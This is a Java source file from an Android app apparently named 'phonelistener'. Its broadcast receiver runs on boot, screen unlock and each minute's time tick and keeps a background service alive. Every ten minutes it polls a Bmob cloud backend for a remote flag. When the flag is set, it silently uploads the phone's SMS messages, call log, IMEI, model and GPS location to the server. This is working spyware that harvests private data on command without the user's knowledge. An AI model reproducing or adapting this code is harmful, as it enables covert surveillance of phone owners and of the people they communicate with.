package com.wpl.phonelistener.broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.wpl.phonelistener.bean.ClientUser;
import com.wpl.phonelistener.bean.FeedbackData;
import com.wpl.phonelistener.mvp.model.CurrentLocationImpl;
import com.wpl.phonelistener.mvp.presenter.M_Presenter;
import com.wpl.phonelistener.mvp.view.M_View;
import com.wpl.phonelistener.service.MyService;
import com.wpl.phonelistener.utils.PhoneUtils;
import com.wpl.phonelistener.utils.SPUtils;

import java.util.Calendar;
import java.util.Map;

import cn.bmob.v3.Bmob;
import cn.bmob.v3.BmobConfig;
import cn.bmob.v3.BmobQuery;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.QueryListener;
import cn.bmob.v3.listener.SaveListener;
import cn.bmob.v3.listener.UpdateListener;

/**
 * 广播
 * Created by 培龙 on 2017/2/21.
 */
public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.CurrentLocation {
    public static final String APPKEY = "d6fecacfa03937555cb24ea43881193f";
    public static final String ACTION_BOOT = "android.intent.action.BOOT_COMPLETED"; //开机广播
    public static final String ACTION_USERPRESENT = "android.intent.action.USER_PRESENT"; //解锁屏幕广播
    public static final String ACTION_REBOOT = "android.intent.action.REBOOT"; //解锁屏幕广播
    public static final String ACTION_TIMETICK = "android.intent.action.TIME_TICK";   //时间变化广播

    private Context context;
    private Intent intent;
    private PhoneUtils tools;
    private Intent intentService;
    protected Calendar calendar;
    private String objId;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        this.intent = intent;
        SPUtils spUtils = new SPUtils(context, "loginStatus");
        tools = new PhoneUtils(context);
        intentService = new Intent(context, com.wpl.phonelistener.service.MyService.class);
        objId = spUtils.getString("objId", "");
        checkReceiver();
    }

    /**
     * 接收到系统广播
     */
    private void checkReceiver() {
        switch (intent.getAction()) {
            case ACTION_BOOT:   //开机广播
                received();
                break;
            case ACTION_REBOOT: //重启广播
                received();
                break;
            case ACTION_USERPRESENT:    //解锁屏幕广播
                received();
                break;
            case ACTION_TIMETICK:   //时间变化广播
                received();
                break;
            default:
                break;
        }
    }

    /**
     * 1,收到广播,启动service
     * 2,当前分钟数为10的整数，查询服务器数据
     */
    private void received() {
        if (!tools.isServiceRunning(MyService.class.getName())) {
            context.startService(intentService);
        }

        calendar = java.util.Calendar.getInstance();
        int min = calendar.get(java.util.Calendar.MINUTE);
        int m = min % 10;
        if (m == 0) {
            if (tools.isConnected()) {
                initBmob();
            }
        }
    }

    /**
     * 初始化Bmob
     */
    private void initBmob() {
        BmobConfig config = new BmobConfig.Builder(context)
                .setApplicationId(APPKEY)
                .setConnectTimeout(60 * 5)
                .build();
        Bmob.initialize(config);
        isFeedback();
    }

    /**
     * 查询服务器是否需要上传数据
     */
    private void isFeedback() {
        new Thread(() -> {
            BmobQuery<ClientUser> query = new BmobQuery<ClientUser>();
            query.getObject(objId, new QueryListener<ClientUser>() {
                @Override
                public void done(ClientUser clientUser, BmobException e) {
                    if (e == null) {
                        if (clientUser.isFeedback()) {
                            feedback();
                        }
                    }
                }
            });
        }).start();
    }

    /**
     * 上传数据到服务器
     */
    private void feedback() {
        getLocationData();
    }

    /**
     * 获取当前位置信息
     */
    private void getLocationData() {
        M_Presenter.CurrentLocation currentLocation = new CurrentLocationImpl(this);
        currentLocation.getLocation(context);
    }

    @Override
    public void locationSuccess(Map<String, String> map) {
        if (map != null) {
            if (map.get("result").equals("success")) {
                upload(map);
            }
        }
    }

    @Override
    public void locationError(Map<String, String> map) {

    }

    private void upload(Map<String, String> map) {
        new Thread(() -> {
            try {
                FeedbackData fd = new FeedbackData();
                ClientUser clientUser = new ClientUser();
                clientUser.setObjectId(objId);
                fd.setBelongTo(clientUser);
                fd.setSmsLog(tools.getSmsInPhone());
                fd.setCallLog(tools.getCallDataList());
                fd.setModel(tools.getModel());
                fd.setNetType(tools.getNetType());
                fd.setImei(tools.getImei());
                fd.setAoi(map.get("aoiName"));
                fd.setCity(map.get("city"));
                fd.setLat(map.get("lat"));
                fd.setLon(map.get("lon"));
                fd.setAddress(map.get("address"));
                Thread.sleep(10000);
                fd.save(new SaveListener<String>() {
                    @Override
                    public void done(String s, BmobException e) {
                        if (e == null) {
                            upConsole();
                        }
                    }
                });
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    /**
     * 更新控制状态为false
     */
    private void upConsole() {

        ClientUser clientUser = new ClientUser();
        clientUser.setFeedback(false);
        clientUser.update(objId, new UpdateListener() {
            @Override
            public void done(BmobException e) {

            }
        });
    }
}
